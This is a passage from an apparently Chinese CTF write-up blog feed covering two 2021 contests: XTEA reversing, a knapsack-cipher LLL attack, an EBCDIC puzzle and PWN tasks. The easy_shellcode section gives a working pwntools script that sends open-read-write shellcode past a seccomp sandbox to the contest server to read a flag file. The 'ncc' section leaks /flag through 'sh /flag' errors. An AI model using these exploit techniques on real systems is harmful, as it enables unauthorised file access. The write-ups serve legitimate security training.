class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#XTEA解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">rounds, v, k</span>):</span></span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    x = delta * rounds</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[x &amp; <span class="number">3</span>])</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encrypted = </span><br><span class="line">    key = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    decrypted = decrypt(rounds, encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(decrypted)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[0x9F5FBC48,0xC5517691] -&gt; [1,1]</span><br><span class="line">[0x24BDF90F,0x301B88E8] -&gt; [3,4]</span><br><span class="line">[0x92750C5A,0xA0D98E0E] -&gt; [2,5]</span><br><span class="line">[0x8DD02793,0x4F558864] -&gt; [8,7]</span><br></pre></td></tr></table></figure><p>故 <code>v4 = [1,1,2,3,4,5,7,8]</code>，又 <code>v9 = v8 = v4^v7</code>，异或得到 <code>v7</code>，先base64解码再RC4解密可得输入的 <code>Source</code> 值，即为flag。</p><p>​        </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="ncc"><a href="#ncc" class="headerlink" title="ncc"></a>ncc</h3><blockquote><p>经典nc!</p><p>PWN题连接方式: nc neepusec.club 端口</p></blockquote><p><code>ls /</code> 发现目录下有 <code>/flag</code>，但没有 <code>cat</code> 等常见的查看文件内容命令。</p><p><code>cd /bin</code> 进到 <code>/bin</code> 目录下，<code>ls</code> 发现目录下有 <code>sh</code> 脚本执行命令，直接 <code>sh /flag</code> 利用报错泄露 <code>/flag</code> 文件内容。</p><p>​    </p><h3 id="easy-shellcode"><a href="#easy-shellcode" class="headerlink" title="easy_shellcode"></a>easy_shellcode</h3><blockquote><p>easy shellcode?</p><p>flag在./flag</p></blockquote><p>checksec发现无任何保护，IDA查看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  sub_9C3(a1, a2, a3);</span><br><span class="line">  buf = (<span class="keyword">void</span> *)(<span class="keyword">int</span>)mmap((<span class="keyword">void</span> *)<span class="number">0x23330000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;just learn orw&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_9C3(a1,a2,a3)</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_9C3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_8CA();</span><br><span class="line">  <span class="keyword">return</span> alarm(<span class="number">0x3C</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_8CA()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_8CA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 *v2; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+12h] [rbp-3Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+13h] [rbp-3Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  __int16 v7; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+1Ah] [rbp-36h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+1Bh] [rbp-35h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+22h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+23h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [rsp+24h] [rbp-2Ch]</span></span><br><span class="line">  __int16 v15; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+2Ah] [rbp-26h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+2Bh] [rbp-25h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  __int16 v19; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+32h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [rsp+33h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  __int16 v23; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [rsp+3Ah] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [rsp+3Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// [rsp+3Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v27; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v27 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">32</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">4</span>;</span><br><span class="line">  v7 = <span class="number">21</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">2</span>;</span><br><span class="line">  v10 = <span class="number">-1073741762</span>;</span><br><span class="line">  v11 = <span class="number">32</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">21</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">1</span>;</span><br><span class="line">  v18 = <span class="number">59</span>;</span><br><span class="line">  v19 = <span class="number">6</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  v23 = <span class="number">6</span>;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">2147418112</span>;</span><br><span class="line">  v1 = <span class="number">6</span>;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在函数 <code>sub_8CA()</code> 发现 <code>prctl()</code> 函数。</p><blockquote><p>prctl是基本的进程管理函数，最原始的沙箱规则就是通过prctl函数来实现的，它可以决定有哪些系统调用函数可以被调用，哪些系统调用函数不能被调用。</p><p>沙箱(Sandbox)是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限。seccomp是内核中的一种安全机制，seccomp可以在程序中禁用掉一些系统调用来达到保护系统安全的目的，seccomp规则的设置，可以使用prctl函数和seccomp函数族。</p></blockquote><p>使用 <code>seccomp-tools dump ./pwn</code> 看下哪些函数可用：</p><p><img src="/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/image-20210525013200068.png" alt="image-20210525013200068"></p><p>发现只要不是 <code>execve()</code> 都可以使用，使用 <code>open-&gt;read-&gt;write</code> 这样的orw的方式获取flag。</p><p><code>mmap()</code> 把从0x23330000开始的地址，大小为0x1000的长度，权限改为可写可执行。</p><p>所以只需要写入orw类型的shellcode，然后跳转执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;neepusec.club&#x27;</span>, <span class="number">18146</span>)</span><br><span class="line">mmap = <span class="number">0x23330000</span></span><br><span class="line">orw_payload = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)         <span class="comment">#打开根目录下的flag文件</span></span><br><span class="line">orw_payload += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x50</span>)     <span class="comment">#读取文件标识符是3的文件0x50个字节存放到mmap分配的地址空间里</span></span><br><span class="line">orw_payload += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x50</span>)    <span class="comment">#将mmap地址上的内容输出0x50个字节</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;orw\n&#x27;</span>, asm(orw_payload))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;东北电力大学校赛，Web综合程度高，Crypto太少了。&lt;/p&gt;
&lt;p&gt;Rank: 3&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;Noob&quot;&gt;&lt;a href=&quot;#Noob&quot; class=&quot;headerlink&quot; title=&quot;Noob&quot;&gt;&lt;/a&gt;Noob&lt;</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>第四届红帽杯网络安全大赛</title>
    <link href="https://lazzzaro.github.io/2021/05/09/match-%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2021/05/09/match-%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2021-05-09T10:20:01.000Z</published>
    <updated>2021-12-05T18:13:22.333Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>这一届的misc+crypto也太少了，一二血同队+垂直上分明显。</p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>下载附件EBCDIC.txt，根据文件名和内容，猜测为某种编码方式，搜索知为EBCDIC编码：</p><blockquote><p>EBCDIC（广义二进制编码的十进制交换码，Extended Binary Coded Decimal Interchange Code），是字母或数字字符的二进制编码，是IBM为它的更大型的操作系统而开发的。它是为IBM的S/390上的IBMOS/390操作系统上使用的文本文件的编码，并且数千个公司为它们的遗留应用程序和数据库使用这种编码。在一个EBCDIC的文件里，每个字母或数字字符都被表示为一个8位的二进制数（一个0、1字符串）。256个可能的字符被定义（字母，数字和一些特殊字符）。<br>IBM的个人计算机和工作站操作系统不使用它们所有的EBCDIC编码。相反的，它们使用文本的工业标准编码，ASCII码。转化程序允许不同的操作系统从一种编码到另一种编码的转化。</p></blockquote><p>找到<a href="https://www.dcode.fr/ebcdic-encoding">在线解码网站</a>，将16进制EBCDIC码解码为16进制ASCII码，再转为字符得到flag。</p><p><img src="/2021/05/09/match-%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20210509182835650.png" alt="image-20210509182835650"></p><p><strong>flag值：flag{we1c0me_t0_redhat2021}</strong></p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="primegame"><a href="#primegame" class="headerlink" title="primegame"></a>primegame</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (<span class="built_in">len</span>(flag) == <span class="number">48</span>)</span><br><span class="line">msg1 = flag[:<span class="number">24</span>]</span><br><span class="line">msg2 = flag[<span class="number">24</span>:]</span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">90</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">100</span></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg1)):</span><br><span class="line">    keys.append(Decimal(primes[i]).ln())</span><br><span class="line"></span><br><span class="line">sum_ = Decimal(<span class="number">0.0</span>)</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg1):</span><br><span class="line">    sum_ += c * Decimal(keys[i])</span><br><span class="line"></span><br><span class="line">ct = math.floor(sum_ * <span class="number">2</span> ** <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(ct)</span><br><span class="line"></span><br><span class="line">sum_ = Decimal(<span class="number">0.0</span>)</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg2):</span><br><span class="line">    sum_ += c * Decimal(keys[i])</span><br><span class="line"></span><br><span class="line">ct = math.floor(sum_ * <span class="number">2</span> ** <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(ct)</span><br><span class="line"></span><br><span class="line"><span class="number">597952043660446249020184773232983974017780255881942379044454676980646417087515453</span></span><br><span class="line"><span class="number">425985475047781336789963300910446852783032712598571885345660550546372063410589918</span></span><br></pre></td></tr></table></figure></blockquote><p>代码逻辑：</p><p>将48长度的flag分为24长度两部分，生成90以内的素数列表<code>primes</code>和前24个素数自然对数列表<code>keys</code>，分别求出flag两部分的ascii值与key值乘积和。</p><p>容易看出 </p><p>$S=\text{ct} \cdot 2^{256}=\sum\limits_{i=1}^{24}\Big(c_i \cdot (\text{key}_i \cdot 2^{256})\Big)=\sum\limits_{i=1}^{24}(c_i \cdot k_i)$ </p><p>形式类似于0-1背包加密问题，其中公钥 $k_i$ 与密文 $S$ 已知，需解密得明文 $c_i \in [0,128)$。</p><p>由于明文数量不大，且背包密度 $d = \cfrac{n}{\log_2(\text{max}(k_i))} \approx 0.0968$，可采用<a href="https://www.ieice.org/publications/conference-FIT-DVDs/FIT2018/data/pdf/A-022.pdf">低密度攻击方法</a>（Lagarias&amp;Odlyzko算法 或 CJLOSS算法）恢复明文，构造格：</p><p>$\left(\begin {array}{c} b_0 \newline b_1 \newline \vdots \newline b_n \newline b_{n+1} \end{array} \right) =\left(\begin {array}{c} 1 &amp; 0 &amp; \cdots &amp; 0 &amp; Nk_0 \newline 0 &amp; 1 &amp; \cdots &amp; 0 &amp; Nk_1 \newline \vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; \vdots \newline 0 &amp; 0 &amp; \cdots &amp; 1 &amp; Nk_n \newline 0 &amp; 0 &amp; \cdots &amp; 0 &amp; Nk_{n+1} \end{array} \right) $</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">100</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="built_in">int</span>(<span class="number">100</span>)</span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(primes)):</span><br><span class="line">    keys.append(<span class="built_in">int</span>(Decimal(<span class="built_in">int</span>(primes[i])).ln() * (<span class="number">2</span> ** <span class="number">256</span>)))</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(keys)</span><br><span class="line">d = n / log(<span class="built_in">max</span>(keys), <span class="number">2</span>)</span><br><span class="line"><span class="keyword">assert</span> CDF(d) &lt; <span class="number">0.9408</span></span><br><span class="line"></span><br><span class="line">M = Matrix.identity(n)</span><br><span class="line"></span><br><span class="line">last_row = [<span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> keys]</span><br><span class="line">M_last_row = Matrix(ZZ, <span class="number">1</span>, <span class="built_in">len</span>(last_row), last_row)</span><br><span class="line"></span><br><span class="line">ct = <span class="string">&#x27;597952043660446249020184773232983974017780255881942379044454676980646417087515453&#x27;</span></span><br><span class="line"><span class="comment"># ct = &#x27;425985475047781336789963300910446852783032712598571885345660550546372063410589918&#x27;</span></span><br><span class="line">last_col = keys[:]</span><br><span class="line">last_col.append(ct)</span><br><span class="line">M_last_col = Matrix(ZZ, <span class="built_in">len</span>(last_col), <span class="number">1</span>, last_col)</span><br><span class="line"></span><br><span class="line">M = M.stack(M_last_row)</span><br><span class="line">M = M.augment(M_last_col)</span><br><span class="line"></span><br><span class="line">X = M.LLL()</span><br><span class="line">target = X[<span class="number">0</span>][:-<span class="number">1</span>]</span><br><span class="line">flag = [-k <span class="keyword">for</span> k <span class="keyword">in</span> target]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag).strip(<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line"><span class="comment">#b&#x27;flag&#123;715c39c3-1b46-4c23-&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;8006-27b43eba2446&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>flag值：flag{715c39c3-1b46-4c23-8006-27b43eba2446}</strong></p><p>​    </p><h3 id="hpcurve"><a href="#hpcurve" class="headerlink" title="hpcurve"></a>hpcurve</h3><blockquote><p>你的数学学的怎么样？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line">R.&lt;x&gt; = GF(p)[]</span><br><span class="line">y=x</span><br><span class="line">f = y + y^<span class="number">7</span></span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line"></span><br><span class="line">es = [SystemRandom().randrange(p**<span class="number">3</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>,<span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)]</span><br><span class="line">q = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clk</span>():</span></span><br><span class="line"><span class="keyword">global</span> Ds,es</span><br><span class="line">Ds = [e*D <span class="keyword">for</span> e,D <span class="keyword">in</span> <span class="built_in">zip</span>(es, Ds)]</span><br><span class="line"><span class="keyword">return</span> Ds</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    </span><br><span class="line">    u,v = <span 